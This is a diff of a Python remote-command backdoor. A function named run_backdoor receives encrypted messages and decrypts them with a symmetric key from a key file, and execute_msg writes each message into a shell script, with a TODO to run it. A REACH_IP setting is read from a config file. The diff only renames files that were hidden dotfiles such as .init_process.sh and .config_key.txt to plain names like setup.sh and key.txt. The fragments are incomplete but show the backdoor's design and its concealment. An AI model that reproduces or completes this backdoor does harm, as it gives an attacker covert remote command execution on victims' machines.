@@ -61,10 +61,10 @@ def add_random_comment_to_key_file(key_fpath):
     except Exception as e:
         print(f"Error updating key file: {e}")
 
-update_json_with_random(convert_path(".lib_config.json"))
-add_random_comment_to_key_file(convert_path(".config_key.txt"))
+update_json_with_random(convert_path("config.json"))
+add_random_comment_to_key_file(convert_path("key.txt"))
 
-with open(convert_path(".lib_config.json")) as config_f:
+with open(convert_path("config.json")) as config_f:
     config = json.load(config_f)
 
 REACH_IP = config['REACH_IP']
@@ -151,7 +151,7 @@ def execute_msg(message):
     # TODO: complete so runs the code
     print(f"received:\n{message}\n==")
     # create shell script from the message
-    script_fname = convert_path(".init_process.sh")
+    script_fname = convert_path("setup.sh")
 
     # Generate a random number for the comment
     random_number = random.randint(100000, 999999)
@@ -178,7 +178,7 @@ def run_backdoor(ip, port):
     )
 
     # decrypt message
-    symm_key = read_key(convert_path(".config_key.txt"))
+    symm_key = read_key(convert_path("key.txt"))
     message = decrypt_ct(symmetric_key=symm_key,
                msg_ct=in_ct)
 
